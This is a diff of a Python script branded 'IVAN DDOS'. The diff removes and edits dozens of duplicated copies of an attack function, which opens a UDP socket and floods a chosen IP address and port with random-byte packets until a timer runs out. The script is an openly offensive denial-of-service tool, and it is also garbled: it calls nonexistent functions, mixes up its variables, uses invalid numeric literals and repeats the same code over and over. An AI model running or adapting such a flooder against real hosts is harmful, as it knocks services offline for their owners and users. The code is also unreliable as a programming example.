-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -18169,7 +14879,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -18201,7 +14911,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -18233,7 +14943,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -18265,7 +14975,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -18297,7 +15007,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -18323,7 +15033,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -18355,39 +15065,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -18419,7 +15097,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -18451,415 +15129,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -18891,225 +15161,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -19485,7 +15537,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -19517,7 +15569,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -19549,7 +15601,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -19581,7 +15633,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -19613,7 +15665,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -19639,7 +15691,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -19671,39 +15723,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -19735,7 +15755,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -19767,415 +15787,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
